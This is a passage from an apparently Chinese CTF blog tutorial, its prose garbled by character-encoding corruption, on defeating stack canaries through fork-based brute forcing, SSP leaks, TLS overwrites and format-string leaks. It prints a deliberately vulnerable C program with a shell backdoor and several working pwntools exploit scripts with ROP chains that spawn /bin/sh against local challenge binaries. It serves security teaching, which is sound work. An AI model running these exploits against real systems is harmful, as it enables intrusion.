class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, <span class="built_in">buffer</span>, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();</span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"welcome"</span>);</span><br><span class="line">			vul();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc main.c -m32 -o bin</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±ç¡¬çˆ†ç ´</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span> + canary + <span class="string">'a'</span>*<span class="number">12</span> + p32(<span class="number">0x80485FB</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">log.success(<span class="string">'key is:'</span> + flag)</span><br><span class="line"><span class="comment">#  [*] Stopped process './bin' (pid 17747)</span></span><br><span class="line"><span class="comment">#  [+] key is:flag&#123;test&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>è¿™ä¸ªæ–¹æ³•ä¸èƒ½getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è§¦å‘canaryæ—¶çš„æŠ¥é”™ä¿¡æ¯ï¼Œæ¥æ‰“å°å‡ºæˆ‘ä»¬æƒ³è¦çš„å†…å­˜ä¸­çš„å€¼ï¼Œä¾‹å¦‚flag<br>è§¦å‘canaryæ—¶ä¼šå»æ‰§è¡Œ_stack_chk_failå‡½æ•°ï¼Œæ‰§è¡Œè¿™ä¸ªå‡½æ•°æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ‰“å°è¿™ä¹ˆä¸€æ®µä¿¡æ¯<br><img src="7.png" alt=""><br>æˆ‘ä»¬åˆ†æä¸‹__stack_chk_failçš„æºç <br><img src="5.png" alt=""><br>ä»–ä¼šè°ƒç”¨ä¸€ä¸ª__fortify_failå‡½æ•°å¹¶ä¼ å…¥â€stack smashing detectedâ€å­—ç¬¦ä¸²<br>æˆ‘ä»¬æ¥ç€åˆ†æ__fortify_failå‡½æ•°<br><img src="6.png" alt=""><br>æ­¤å¤„ï¼Œç¬¬ä¸€ä¸ª%sçš„å‚æ•°æ˜¯msgï¼Œç¬¬äºŒä¸ªå‚æ•°éœ€è¦åˆ¤æ–­ï¼Œå¦‚æœmsg!=NULLï¼Œå°±æ‰“å°__libc_argv[0]ï¼Œå¦åˆ™æ‰“å°â€&lt;unknown&gt;â€ï¼Œè€Œargv[0]å­˜å‚¨çš„å°±æ˜¯ç¨‹åºåï¼Œä¸”è¿™ä¸ªå‚æ•°å­˜äºæ ˆä¸Šï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹æ ˆä¸Šçš„argv[0]æŒ‡é’ˆä¸ºflagçš„åœ°å€ï¼Œå°±å¯ä»¥æ‰“å°å‡ºflag</p>
<h3 id="ä¾‹é¢˜ï¼šwdb2018-guess"><a href="#ä¾‹é¢˜ï¼šwdb2018-guess" class="headerlink" title="ä¾‹é¢˜ï¼šwdb2018_guess"></a>ä¾‹é¢˜ï¼šwdb2018_guess</h3><p>åˆ†æmainå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = <span class="built_in">open</span>(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">close</span>(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</span><br><span class="line">  gets(s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_400A11å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400A11</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"can not fork"</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œforkäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ä¸”åˆ¤æ–­ä¾æ®æ˜¯v7çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªç¨‹åºå¯ä»¥å´©æºƒ3æ¬¡<br>è¿™å§¿åŠ¿å’Œé¢˜ç›®æˆ‘ä¸“é—¨å†™äº†ä¸€ç¯‡ï¼Œæ€è·¯å¯ä»¥ç›´æ¥çœ‹<a href="https://n0vice.top/2020/04/09/Stack-smash/" target="_blank" rel="noopener">stack smash</a></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">binary = <span class="string">'./pwn1'</span> </span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p=process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">""</span>,)</span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"flag\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">    puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))</span><br><span class="line">    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">'environ'</span>]</span><br><span class="line">    p.recvuntil(<span class="string">"flag\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(environ)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">    stack_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(<span class="string">"stack_addr==&gt;"</span> + hex(stack_addr))</span><br><span class="line">    flag = stack_addr - <span class="number">0x168</span></span><br><span class="line">    p.recvuntil(<span class="string">"flag\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">296</span> + p64(flag)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨glibc2.27åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­å·²å¤±æ•ˆ<br>æˆ‘ä»¬ç»§ç»­åˆ†æ2.27çš„æºç <br><img src="8.png" alt=""><br><img src="9.png" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œ__fortify_fail_abortå‡½æ•°æ—¶å¤šä¼ å…¥äº†ä¸€ä¸ªneed_backtraceå‚æ•°ï¼Œè€Œæ•´ä¸ªå‚æ•°åœ¨å‰é¢å°±å·²ç»å†™æ­»æˆfalseäº†ï¼Œæ‰€ä»¥æ‰§è¡Œ__libc_messageå‡½æ•°æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¹Ÿè¢«å†™æ­»æˆäº†â€&lt;unknown&gt;â€å­—ç¬¦ä¸²ï¼Œæ‰“å°ä¸äº†æ ˆä¸­çš„ä¿¡æ¯äº†</p>
<h2 id="ä¿®æ”¹TLSç»“æ„ä½“"><a href="#ä¿®æ”¹TLSç»“æ„ä½“" class="headerlink" title="ä¿®æ”¹TLSç»“æ„ä½“"></a>ä¿®æ”¹TLSç»“æ„ä½“</h2><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“canaryæ˜¯ä»<strong>å“ªé‡Œ</strong>è¢«å–å‡ºæ¥çš„<br>éšä¾¿æŸ¥çœ‹ä¸€ä¸ª64ä½çš„ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»fsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»çš„ä½ç½®å–å‡ºæ¥çš„<br>è€Œåˆå§‹åŒ–canaryæ—¶ï¼Œfså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®å°±æ˜¯TLSç»“æ„ä½“<br><img src="11.png" alt=""><br>è¿™ä¸ªè¢«å®šä¹‰åœ¨glibc/sysdeps/x86_64/nptl/tls.hä¸­ç»“æ„ä½“tcbhead_tå°±æ˜¯ç”¨æ¥æè¿°TLSçš„<br><img src="12.png" alt=""><br><img src="13.png" alt=""><br>ä»¥ä¸Šæ˜¯libc_start_mainå…³äºcanaryç”Ÿæˆçš„è¿‡ç¨‹ï¼Œ_dl_randomæ˜¯å†…æ ¸æä¾›çš„éšæœºæ•°ç”Ÿæˆå™¨<br>fsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»å¤„çš„å˜é‡uintptr_t stack_chk_guardå°±æ˜¯canaryçš„å€¼</p>
<h3 id="ä¾‹é¢˜ï¼š-CTF2018-babystack"><a href="#ä¾‹é¢˜ï¼š-CTF2018-babystack" class="headerlink" title="ä¾‹é¢˜ï¼š*CTF2018 babystack"></a>ä¾‹é¢˜ï¼š*CTF2018 babystack</h3><p>åˆ†æä»£ç <br><img src="14.png" alt=""><br><img src="15.png" alt=""><br>ç¨‹åºåœ¨mainå‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªå­çº¿ç¨‹ï¼Œå¹¶åœ¨å…¶ä¸­è°ƒç”¨æ ˆæº¢å‡ºå‡½æ•°ï¼Œé¦–å…ˆè¾“å…¥sizeï¼Œç„¶åè¯»å…¥sizeå¤§å°çš„å­—ç¬¦<br>åœ¨å¤šçº¿ç¨‹ä¸­TLSå°†è¢«æ”¾ç½®åœ¨å¤šçº¿ç¨‹çš„æ ˆçš„é¡¶éƒ¨ï¼Œå› æ­¤æˆ‘ä»¬èƒ½ç›´æ¥é€šè¿‡æ ˆæº¢å‡ºå¯¹canaryåˆå§‹å€¼è¿›è¡Œæ›´æ”¹</p>
<h4 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h4><p>æ–­ç‚¹åœ¨mainå‡½æ•°ï¼ŒæŸ¥çœ‹canaryçš„åœ°å€ï¼Œåªèƒ½å‘ç°stackå’Œtlsç»“æ„ä½“ä¸­ä¸¤ä¸ªcanaryçš„å€¼<br><img src="16.png" alt=""><br>å†æ–­ç‚¹åˆ°çº¿ç¨‹å‡½æ•°ï¼Œæœç´¢canaryï¼Œä¼šå‘ç°tlsè¢«åˆå§‹åŒ–äº†ï¼Œå°±æ˜¯å¤šçº¿ç¨‹å‡½æ•°åœ¨libcä¸Šæ–¹mmapä¸€æ®µç©ºé—´ç”¨æ¥å¼€è¾Ÿäº†ä¸€ä¸ªæ–°çš„tlsç»“æ„<br><img src="18.png" alt=""><br><img src="17.png" alt=""><br>å¹¶ä¸”è¿™ä¸ªtlsç»“æ„é™¤äº†canaryå…¶ä»–éƒ½æ²¡æœ‰ç”¨ï¼Œè¿™æ®µç©ºé—´é‡Œé¢çš„æ•°æ®éƒ½æ˜¯éšä¾¿å¯å†™çš„<br>æˆ‘ä»¬å¯ä»¥gdb.attachç»™canaryå‰çš„å˜é‡æ–­ç‚¹ï¼Œç„¶åcontinueï¼Œå¦‚æœæ‰“é€šäº†ï¼Œè¯´æ˜æ²¡æœ‰é‡åˆ°æ–­ç‚¹ï¼Œå³åœ¨å­çº¿ç¨‹ä¸­canaryä¹‹å‰çš„å˜é‡ä¸éœ€è¦ç”¨åˆ°çš„ç³»ç»Ÿè°ƒç”¨æ— å…³<br>ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œåœ¨canaryä¹‹å‰çš„é‚£å‡ ä¸ªå˜é‡ï¼Œåœ¨æ­£å¸¸ç¨‹åºä¸­ä¸ç³»ç»Ÿè°ƒç”¨æœ‰å…³ï¼Œä¸èƒ½ç›´æ¥æ”¹å†™ï¼Œä¸€èˆ¬åˆ©ç”¨æ•°ç»„è¶Šç•Œæ¥è·³è¿‡ä»–ä»¬å»æ”¹å†™canary<br>iæ˜¥ç§‹å…¬ç›ŠCTF_BFnoteè¿™é¢˜å°±æ˜¯åˆ©ç”¨æ•°ç»„è¶Šç•Œè·³è¿‡å®ƒä»¬å»æ”¹å†™canary<br>åœ¨å†…å­˜é‡Œå¤§æ¦‚é•¿è¿™æ ·<br><img src="19.png" alt=""></p>
<h4 id="æ•´ä½“æ€è·¯"><a href="#æ•´ä½“æ€è·¯" class="headerlink" title="æ•´ä½“æ€è·¯"></a>æ•´ä½“æ€è·¯</h4><p>â‘ è§¦å‘æ ˆæº¢å‡ºï¼Œå°†Canaryè¦†ç›–ä¸ºaaaaaaaaï¼ŒåŒæ—¶ä½¿ç”¨è¶…é•¿çš„payloadå°†TLSä¸­çš„Canaryä¸€å¹¶è¦†ç›–ä¸ºaaaaaaaa<br>â‘¡æ ˆè¿ç§»åˆ°bssæ®µ<br>â‘¢ROP</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./bs"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">read_plt=<span class="number">0x4007e0</span></span><br><span class="line">puts_got=<span class="number">0x601fb0</span></span><br><span class="line">put_plt=<span class="number">0x4007c0</span></span><br><span class="line">buf=<span class="number">0x602f00</span></span><br><span class="line">leave_ret=<span class="number">0x400955</span></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret)+p64(puts_got)+p64(put_plt)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(buf+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(read_plt)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">p.sendline(str(<span class="number">6128</span>))</span><br><span class="line">p.send(<span class="string">"a"</span>*<span class="number">4112</span>+p64(buf)+payload+<span class="string">"a"</span>*(<span class="number">6128</span><span class="number">-4120</span>-len(payload)))</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))</span><br><span class="line">log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.success(<span class="string">"system_addr==&gt;"</span> + hex(system))</span><br><span class="line">log.success(<span class="string">"binsh==&gt;"</span> + hex(binsh))</span><br><span class="line"></span><br><span class="line">p.sendline(p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²leak-canary"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²leak-canary" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary</h2><p>é’ˆå¯¹æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ ˆæº¢å‡ºç¨‹åºï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥ä»»æ„åœ°å€è¯»å†™çš„ç‰¹ç‚¹ï¼Œæ³„éœ²å‡ºæ ˆä¸Šçš„canaryï¼Œå¹¶å¡«å…¥å¯¹åº”ä½ç½®ï¼Œç„¶ååˆ©ç”¨æ ˆæº¢å‡ºget shell<br>è¿™é‡Œæˆ‘æ‰¾äº†ä¸€ä¸ªå…¸å‹çš„ä¾‹é¢˜ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—ä¸€ä¸‹åç§»ï¼Œç„¶ååˆ©ç”¨%pæ¥æ³„éœ²canary</p>
<h3 id="ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017-Mary-Morton"><a href="#ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017 Mary_Morton"></a>ä¾‹é¢˜ï¼šASIS-CTF-Finals-2017 Mary_Morton</h3><p>mainå‡½æ•°<br><img src="20.png" alt=""><br>æœ‰é€‰é¡¹å¯ä»¥é€‰<br><img src="21.png" alt=""><br>é€‰é¡¹2æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<br><img src="22.png" alt=""><br>é€‰é¡¹1æœ‰æ ˆæº¢å‡ºæ¼æ´<br><img src="23.png" alt=""><br>è¿˜æœ‰åé—¨<br><img src="24.png" alt=""><br>å¼€äº†canaryä¿æŠ¤<br>æ„å‘³ç€è¦ä¹ˆæº¢å‡ºå»è§¦å‘canaryï¼Œè¦ä¹ˆåªèƒ½åˆ©ç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å†…å­˜<br>æˆ‘ä»¬é¦–å…ˆç¡®å®šåˆ°å¯æ§è¾“å…¥ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬å‡ ä¸ªå‚æ•°<br><img src="25.png" alt=""><br>å°è¯•ä¸€ç•ªå¯ä»¥å‘ç°æ˜¯ç¬¬6ä¸ªå‚æ•°çš„ä½ç½®<br><img src="26.png" alt=""><br>ç„¶åè®¡ç®—å‡ºbufå’Œcanaryä¹‹é—´çš„è·ç¦»ä¸º0x90-0x8=0x88=136<br>è¿™æ˜¯ä¸ª64ä½ç¨‹åºï¼Œ8å­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œ136/8=17ï¼Œé‚£ä¹ˆcanaryè·ç¦»æ 